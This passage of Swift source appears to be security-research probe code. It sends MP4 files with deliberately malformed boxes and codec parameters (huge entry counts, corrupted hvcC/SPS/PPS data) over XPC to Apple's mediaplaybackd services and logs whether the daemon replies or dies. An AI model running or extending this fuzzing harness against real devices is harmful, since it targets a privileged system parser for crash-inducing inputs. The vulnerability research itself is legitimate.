            guard d.count > 8 else { return nil }
            var i = 4
            while i + 4 <= d.count {
                if d[i] == t[0] && d[i+1] == t[1] && d[i+2] == t[2] && d[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }

        // tkhd: width lives at box_start + 84, 16.16 fixed point.
        var mutated = [UInt8](original)
        var patched = false
        if let i = findTag(mutated, "tkhd") {
            let p = i + 80
            if p + 4 <= mutated.count {
                mutated[p] = 0x05
                mutated[p+1] = 0x00
                mutated[p+2] = 0x00
                mutated[p+3] = 0x00     // width = 1280.0
                patched = true
            }
        }
        emit("xct2: tkhd patch applied=\(patched)")

        guard let c = "com.apple.coremedia.mediaplaybackd.asset.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xct2: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            self.emit("xct2: EVENT \(self.describe(e))")
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xct2: no token"); xq_release(c); return }

        for (label, bytes) in [("baseline", original), ("width1280", Data(mutated))] {
            guard let m = xq_dictionary_create(nil, nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            bytes.withUnsafeBytes { raw in
                if let dd = xq_data_create(raw.baseAddress, raw.count) {
                    "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                    xq_release(dd)
                }
            }
            "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
            "FormatIdentifier".withCString { k in
                "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
            }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            var assetOID: UInt64 = 0
            if let r = sendSync(c, m, timeout: 10.0) {
                assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xct2: [\(label)] crBB err=\(e) id=\(assetOID)")
                xq_release(r)
            }
            xq_release(m)
            guard assetOID != 0 else { continue }

            // Force the track list so the track object exists.
            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x6c6f6431) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, assetOID) }
                ".PropertyName".withCString { k in
                    "assetProperty_Tracks".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(c, s, timeout: 8.0) { xq_release(r) }
                xq_release(s)
            }
            Thread.sleep(forTimeInterval: 1.0)

            let trackOID = assetOID &+ 256
            for prop in ["NaturalSize", "FormatDescriptionArray"] {
                if let s = xq_dictionary_create(nil, nil, 0) {
                    ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x54637079) }
                    ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
                    ".objectID".withCString { xq_dictionary_set_uint64(s, $0, trackOID) }
                    ".PropertyName".withCString { k in
                        prop.withCString { v in xq_dictionary_set_string(s, k, v) }
                    }
                    if let r = sendSync(c, s, timeout: 6.0) {
                        let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                        emit("xct2: [\(label)] \(prop) err=\(e)")
                        if e == 0 { emit("xct2:   value=\(describe(r))") }
                        xq_release(r)
                    }
                    xq_release(s)
                }
                Thread.sleep(forTimeInterval: 0.5)
            }
            Thread.sleep(forTimeInterval: 0.8)
        }
        Thread.sleep(forTimeInterval: 1.5)
        xq_cancel(c); xq_release(c)
        emit("xct2: done")
    }

    func fuzzProbe() {
        emit("xfz2: codec config fuzz with oracle")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xfz2: sample missing"); return
        }

        func findTag(_ d: [UInt8], _ tag: String) -> Int? {
            let t = Array(tag.utf8)
            guard d.count > 8 else { return nil }
            var i = 4
            while i + 4 <= d.count {
                if d[i] == t[0] && d[i+1] == t[1] && d[i+2] == t[2] && d[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func put32(_ d: inout [UInt8], _ p: Int, _ v: UInt32) {
            guard p >= 0, p + 4 <= d.count else { return }
            d[p] = UInt8((v >> 24) & 0xFF)
            d[p+1] = UInt8((v >> 16) & 0xFF)
            d[p+2] = UInt8((v >> 8) & 0xFF)
            d[p+3] = UInt8(v & 0xFF)
        }
        func build(_ kind: String) -> Data? {
            var d = [UInt8](original)
            switch kind {
            case "hvcc_arrays":
                guard let i = findTag(d, "hvcC"), i + 20 < d.count else { return nil }
                d[i + 18] = 0xFF
            case "hvcc_hdr_only":
                guard let i = findTag(d, "hvcC") else { return nil }
                put32(&d, i - 4, 8)
            case "hvcc_level":
                guard let i = findTag(d, "hvcC"), i + 14 < d.count else { return nil }
                d[i + 12] = 0xFF
            case "stsd_count":
                guard let i = findTag(d, "stsd") else { return nil }
                put32(&d, i + 8, 0xFFFFFFFF)
            case "ctts_count":
                guard let i = findTag(d, "ctts") else { return nil }
                put32(&d, i + 8, 0xFFFFFFFF)
            case "elst_count":
                guard let i = findTag(d, "elst") else { return nil }
                put32(&d, i + 8, 0xFFFFFFFF)
            case "stss_count":
                guard let i = findTag(d, "stss") else { return nil }
                put32(&d, i + 8, 0xFFFFFFFF)
            default:
                return nil
            }
            return Data(d)
        }

        guard let c = "com.apple.coremedia.mediaplaybackd.asset.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xfz2: connect failed"); return
        }
        xq_set_event_handler(c) { _ in }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xfz2: no token"); xq_release(c); return }

        for kind in ["hvcc_arrays", "hvcc_hdr_only", "hvcc_level", "stsd_count",
                     "ctts_count", "elst_count", "stss_count"] {
            guard let payload = build(kind) else { emit("xfz2: [\(kind)] no tag"); continue }
            guard let m = xq_dictionary_create(nil, nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            payload.withUnsafeBytes { raw in
                if let dd = xq_data_create(raw.baseAddress, raw.count) {
                    "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                    xq_release(dd)
                }
            }
            "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
            "FormatIdentifier".withCString { k in
                "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
            }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            var assetOID: UInt64 = 0
            if let r = sendSync(c, m, timeout: 10.0) {
                assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xfz2: [\(kind)] crBB err=\(e)")
                xq_release(r)
            } else {
                emit("xfz2: [\(kind)] crBB no reply (daemon may have died)")
            }
            xq_release(m)
            guard assetOID != 0 else { Thread.sleep(forTimeInterval: 0.4); continue }

            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x6c6f6431) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, assetOID) }
                ".PropertyName".withCString { k in
                    "assetProperty_Tracks".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(c, s, timeout: 8.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xfz2: [\(kind)] Tracks err=\(e)")
                    xq_release(r)
                } else {
                    emit("xfz2: [\(kind)] Tracks no reply")
                }
                xq_release(s)
            }
            Thread.sleep(forTimeInterval: 0.8)

            let trackOID = assetOID &+ 256
            for prop in ["NaturalSize", "FormatDescriptionArray"] {
                if let s = xq_dictionary_create(nil, nil, 0) {
                    ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x54637079) }
                    ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
                    ".objectID".withCString { xq_dictionary_set_uint64(s, $0, trackOID) }
                    ".PropertyName".withCString { k in
                        prop.withCString { v in xq_dictionary_set_string(s, k, v) }
                    }
                    if let r = sendSync(c, s, timeout: 6.0) {
                        let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                        emit("xfz2: [\(kind)] \(prop) err=\(e)")
                        xq_release(r)
                    } else {
                        emit("xfz2: [\(kind)] \(prop) no reply (daemon may have died)")
                    }
                    xq_release(s)
                }
                Thread.sleep(forTimeInterval: 0.4)
            }
            Thread.sleep(forTimeInterval: 0.5)
        }
        xq_cancel(c); xq_release(c)
        emit("xfz2: done")
    }

    func diffProbe() {
        emit("xdf: diff the parsed format description")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xdf: sample missing"); return
        }

        func findTag(_ d: [UInt8], _ tag: String) -> Int? {
            let t = Array(tag.utf8)
            guard d.count > 8 else { return nil }
            var i = 4
            while i + 4 <= d.count {
                if d[i] == t[0] && d[i+1] == t[1] && d[i+2] == t[2] && d[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }
        func build(_ kind: String) -> Data {
            var d = [UInt8](original)
            switch kind {
            case "hvcc_arrays":
                if let i = findTag(d, "hvcC"), i + 20 < d.count { d[i + 18] = 0xFF }
            case "hvcc_level":
                if let i = findTag(d, "hvcC"), i + 14 < d.count { d[i + 12] = 0xFF }
            default:
                break
            }
            return Data(d)
        }
        func fnv(_ p: UnsafePointer<UInt8>, _ n: Int) -> UInt64 {
            var h: UInt64 = 0xcbf29ce484222325
            for i in 0..<n {
                h ^= UInt64(p[i])
                h = h &* 0x100000001b3
            }
            return h
        }

        guard let c = "com.apple.coremedia.mediaplaybackd.asset.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xdf: connect failed"); return
        }
        xq_set_event_handler(c) { [weak self] e in
            guard let self else { return }
            let d = self.describe(e)
            if d.contains("assetProperty_Tracks") { self.emit("xdf: EV \(d)") }
        }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xdf: no token"); xq_release(c); return }

        for kind in ["baseline", "hvcc_arrays", "hvcc_level"] {
            let payload = build(kind)
            guard let m = xq_dictionary_create(nil, nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            payload.withUnsafeBytes { raw in
                if let dd = xq_data_create(raw.baseAddress, raw.count) {
                    "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                    xq_release(dd)
                }
            }
            "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
            "FormatIdentifier".withCString { k in
                "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
            }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            var assetOID: UInt64 = 0
            if let r = sendSync(c, m, timeout: 10.0) {
                assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xdf: [\(kind)] crBB err=\(e) id=\(assetOID) inHash=\(payload.count)")
                xq_release(r)
            }
            xq_release(m)
            guard assetOID != 0 else { continue }

            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x6c6f6431) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, assetOID) }
                ".PropertyName".withCString { k in
                    "assetProperty_Tracks".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(c, s, timeout: 8.0) { xq_release(r) }
                xq_release(s)
            }
            Thread.sleep(forTimeInterval: 1.0)

            let trackOID = assetOID &+ 256
            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x54637079) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, trackOID) }
                ".PropertyName".withCString { k in
                    "FormatDescriptionArray".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(c, s, timeout: 6.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit("xdf: [\(kind)] FDA err=\(e) track=\(trackOID)")
                    if e == 0,
                       let v = ".Value".withCString({ xq_dictionary_get_value(r, $0) }),
                       let p = xq_data_bytes(v) {
                        let n = xq_data_len(v)
                        var hex = ""
                        for i in 0..<min(24, n) { hex += String(format: "%02x", p[i]) }
                        emit("xdf: [\(kind)] len=\(n) fnv=\(String(format: "%016llx", fnv(p, n))) head=\(hex)")
                    }
                    xq_release(r)
                } else {
                    emit("xdf: [\(kind)] FDA no reply")
                }
                xq_release(s)
            }
            Thread.sleep(forTimeInterval: 0.6)
        }
        xq_cancel(c); xq_release(c)
        emit("xdf: done")
    }

    func spsProbe() {
        emit("xsp2: SPS/PPS content mutations")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xsp2: sample missing"); return
        }

        func findTag(_ d: [UInt8], _ tag: String) -> Int? {
            let t = Array(tag.utf8)
            guard d.count > 8 else { return nil }
            var i = 4
            while i + 4 <= d.count {
                if d[i] == t[0] && d[i+1] == t[1] && d[i+2] == t[2] && d[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }

        // hvcC box start = index of type - 4.
        //   +8 version, +20 general_level_idc, +30 numOfArrays, +31 arrays.
        // Array: completeness+type(1), numNalus(2), then nalUnitLength(2)+data.
        func build(_ kind: String) -> Data? {
            var d = [UInt8](original)
            guard let i = findTag(d, "hvcC"), i + 40 < d.count else { return nil }
            let box = i - 4
            switch kind {
            case "baseline":
                break
            case "level":
                d[box + 20] = 0xFF
            case "num_arrays":
                d[box + 30] = 0xFF
            case "sps_byte":
                var p = box + 31
                guard p + 5 < d.count else { return nil }
                let nalus = (Int(d[p+1]) << 8) | Int(d[p+2])
                guard nalus > 0 else { return nil }
                let len = (Int(d[p+3]) << 8) | Int(d[p+4])
                let start = p + 5
                guard len > 1, start + len <= d.count else { return nil }
                d[start + len - 1] ^= 0xFF
            case "pps_byte":
                var p = box + 31
                guard p + 5 < d.count else { return nil }
                let nalus = (Int(d[p+1]) << 8) | Int(d[p+2])
                guard nalus > 0 else { return nil }
                let len = (Int(d[p+3]) << 8) | Int(d[p+4])
                let next = p + 5 + len
                guard next + 5 < d.count else { return nil }
                let n2 = (Int(d[next+1]) << 8) | Int(d[next+2])
                guard n2 > 0 else { return nil }
                let l2 = (Int(d[next+3]) << 8) | Int(d[next+4])
                let s2 = next + 5
                guard l2 > 1, s2 + l2 <= d.count else { return nil }
                d[s2 + l2 - 1] ^= 0xFF
            default:
                return nil
            }
            return Data(d)
        }

        func fnv(_ p: UnsafePointer<UInt8>, _ n: Int) -> UInt64 {
            var h: UInt64 = 0xcbf29ce484222325
            for i in 0..<n {
                h ^= UInt64(p[i])
                h = h &* 0x100000001b3
            }
            return h
        }

        guard let c = "com.apple.coremedia.mediaplaybackd.asset.xpc"
            .withCString({ xq_connection_create_service($0, queue, 0) }) else {
            emit("xsp2: connect failed"); return
        }
        xq_set_event_handler(c) { _ in }
        xq_resume(c)

        var tok: Int64 = 0
        if let ping = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
            ".ProcessName".withCString { k in
                "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
            }
            if let r = sendSync(c, ping, timeout: 4.0) {
                tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                xq_release(r)
            }
            xq_release(ping)
        }
        guard tok != 0 else { emit("xsp2: no token"); xq_release(c); return }

        for kind in ["baseline", "level", "num_arrays", "sps_byte", "pps_byte"] {
            guard let payload = build(kind) else { emit("xsp2: [\(kind)] build failed"); continue }
            guard let m = xq_dictionary_create(nil, nil, 0) else { continue }
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, tok) }
            payload.withUnsafeBytes { raw in
                if let dd = xq_data_create(raw.baseAddress, raw.count) {
                    "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                    xq_release(dd)
                }
            }
            "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
            "FormatIdentifier".withCString { k in
                "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
            }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            var assetOID: UInt64 = 0
            if let r = sendSync(c, m, timeout: 10.0) {
                assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xsp2: [\(kind)] crBB err=\(e) id=\(assetOID)")
                xq_release(r)
            }
            xq_release(m)
            guard assetOID != 0 else { continue }

            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x6c6f6431) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, assetOID) }
                ".PropertyName".withCString { k in
                    "assetProperty_Tracks".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(c, s, timeout: 8.0) { xq_release(r) }
                xq_release(s)
            }
            Thread.sleep(forTimeInterval: 0.9)
            let trackOID = assetOID &+ 256

            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x54637079) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, tok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, trackOID) }
                ".PropertyName".withCString { k in
                    "FormatDescriptionArray".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(c, s, timeout: 6.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    if e == 0,
                       let v = ".Value".withCString({ xq_dictionary_get_value(r, $0) }),
                       let p = xq_data_bytes(v) {
                        let n = xq_data_len(v)
                        emit("xsp2: [\(kind)] FDA len=\(n) fnv=\(String(format: "%016llx", fnv(p, n)))")
                    } else {
                        emit("xsp2: [\(kind)] FDA err=\(e)")
                    }
                    xq_release(r)
                } else {
                    emit("xsp2: [\(kind)] FDA no reply")
                }
                xq_release(s)
            }
            Thread.sleep(forTimeInterval: 0.5)
        }
        xq_cancel(c); xq_release(c)
        emit("xsp2: done")
    }

    func frameProbe() {
        emit("xfr: request a decoded frame")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let data = try? Data(contentsOf: mp4) else {
            emit("xfr: sample missing"); return
        }
        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in
                for (i, x) in raw.enumerated() { b[i] = x }
            }
            withUnsafeBytes(of: scale.littleEndian) { raw in
                for (i, x) in raw.enumerated() { b[8 + i] = x }
            }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in
                for (i, x) in raw.enumerated() { b[12 + i] = x }
            }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }
        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIG") { self.emit("xfr: EVENT \(d)") }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        guard let (ac, atok) = open("asset") else { emit("xfr: asset connect failed"); return }
        var assetOID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
            data.withUnsafeBytes { raw in
                if let dd = xq_data_create(raw.baseAddress, raw.count) {
                    "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                    xq_release(dd)
                }
            }
            "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
            "FormatIdentifier".withCString { k in
                "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
            }
            if let opts = xq_dictionary_create(nil, nil, 0) {
                ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                xq_release(opts)
            }
            if let r = sendSync(ac, m, timeout: 10.0) {
                assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xfr: crBB err=\(e) id=\(assetOID)")
                xq_release(r)
            }
            xq_release(m)
        }
        guard assetOID != 0 else { xq_release(ac); return }

        guard let (gc, gtok) = open("assetimagegenerator") else {
            emit("xfr: generator connect failed"); xq_release(ac); return
        }
        var genOID: UInt64 = 0
        if let m = xq_dictionary_create(nil, nil, 0),
           let opts = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
            ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
            "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
            "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
            if let r = sendSync(gc, m, timeout: 10.0) {
                genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xfr: crea err=\(e) id=\(genOID)")
                xq_release(r)
            }
            xq_release(opts); xq_release(m)
        }
        xq_release(ac)
        guard genOID != 0 else { xq_release(gc); emit("xfr: no generator"); return }

        if let m = xq_dictionary_create(nil, nil, 0),
           let opts = xq_dictionary_create(nil, nil, 0) {
            ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }   // req1
            ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
            ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
            if let t = cmTime(0, 600) {
                "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                xq_release(t)
            }
            "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
            if let r = sendSync(gc, m, timeout: 12.0) {
                let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                emit("xfr: req1 err=\(e)")
                emit("xfr:   \(describe(r))")
                xq_release(r)
            } else {
                emit("xfr: req1 no reply (daemon may have died)")
            }
            xq_release(opts); xq_release(m)
        }
        Thread.sleep(forTimeInterval: 3.0)
        xq_cancel(gc); xq_release(gc)
        emit("xfr: done")
    }

    func decoderFuzzProbe() {
        emit("xdf2: decoder-level fuzz")
        guard let mp4 = Bundle.main.url(forResource: "real_v", withExtension: "mp4"),
              let original = try? Data(contentsOf: mp4) else {
            emit("xdf2: sample missing"); return
        }

        func findTag(_ d: [UInt8], _ tag: String) -> Int? {
            let t = Array(tag.utf8)
            guard d.count > 8 else { return nil }
            var i = 4
            while i + 4 <= d.count {
                if d[i] == t[0] && d[i+1] == t[1] && d[i+2] == t[2] && d[i+3] == t[3] { return i }
                i += 1
            }
            return nil
        }

        // Find the first NAL payload inside hvcC arrays and return (offset, length).
        func firstNal(_ d: [UInt8]) -> (Int, Int)? {
            guard let i = findTag(d, "hvcC") else { return nil }
            let p = i - 4 + 31
            guard p + 5 < d.count else { return nil }
            let nalus = (Int(d[p+1]) << 8) | Int(d[p+2])
            guard nalus > 0 else { return nil }
            let len = (Int(d[p+3]) << 8) | Int(d[p+4])
            let start = p + 5
            guard len > 2, start + len <= d.count else { return nil }
            return (start, len)
        }

        func build(_ kind: String) -> Data? {
            var d = [UInt8](original)
            switch kind {
            case "baseline":
                break
            case "sps_flip":
                guard let (s, n) = firstNal(d) else { return nil }
                for k in 0..<3 { d[s + n - 1 - k] ^= 0xA5 }
            case "sps_mid":
                guard let (s, n) = firstNal(d) else { return nil }
                guard n > 8 else { return nil }
                for k in 0..<4 { d[s + n/2 + k] ^= 0x5A }
            case "sps_trunc":
                guard let i = findTag(d, "hvcC") else { return nil }
                let p = i - 4 + 31
                guard p + 5 < d.count else { return nil }
                let len = (Int(d[p+3]) << 8) | Int(d[p+4])
                guard len > 4 else { return nil }
                let nl = len - 2
                d[p+3] = UInt8((nl >> 8) & 0xFF)
                d[p+4] = UInt8(nl & 0xFF)
            case "mdat_flip":
                guard let i = findTag(d, "mdat") else { return nil }
                let start = i + 4
                guard start + 256 < d.count else { return nil }
                for k in 0..<128 { d[start + 1024 + k] ^= 0xFF }
            default:
                return nil
            }
            return Data(d)
        }

        func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
            var b = [UInt8](repeating: 0, count: 24)
            withUnsafeBytes(of: value.littleEndian) { raw in
                for (i, x) in raw.enumerated() { b[i] = x }
            }
            withUnsafeBytes(of: scale.littleEndian) { raw in
                for (i, x) in raw.enumerated() { b[8 + i] = x }
            }
            withUnsafeBytes(of: Int32(1).littleEndian) { raw in
                for (i, x) in raw.enumerated() { b[12 + i] = x }
            }
            return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
        }

        let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
        gotFrame.pointee = false
        gotFail.pointee = false

        func open(_ svc: String) -> (XObj, Int64)? {
            let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
            guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
            xq_set_event_handler(c) { [weak self] e in
                guard let self else { return }
                let d = self.describe(e)
                if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true; self.emit("xdf2: FRAME ok") }
                if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true; self.emit("xdf2: FRAME failed") }
            }
            xq_resume(c)
            var tok: Int64 = 0
            if let ping = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                ".ProcessName".withCString { k in
                    "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                }
                if let r = sendSync(c, ping, timeout: 4.0) {
                    tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                    xq_release(r)
                }
                xq_release(ping)
            }
            return tok != 0 ? (c, tok) : nil
        }

        for kind in ["baseline", "sps_flip", "sps_mid", "sps_trunc", "mdat_flip"] {
            guard let payload = build(kind) else { emit("xdf2: [\(kind)] build failed"); continue }
            gotFrame.pointee = false
            gotFail.pointee = false

            guard let (ac, atok) = open("asset") else { emit("xdf2: [\(kind)] asset connect failed"); continue }
            var assetOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                payload.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
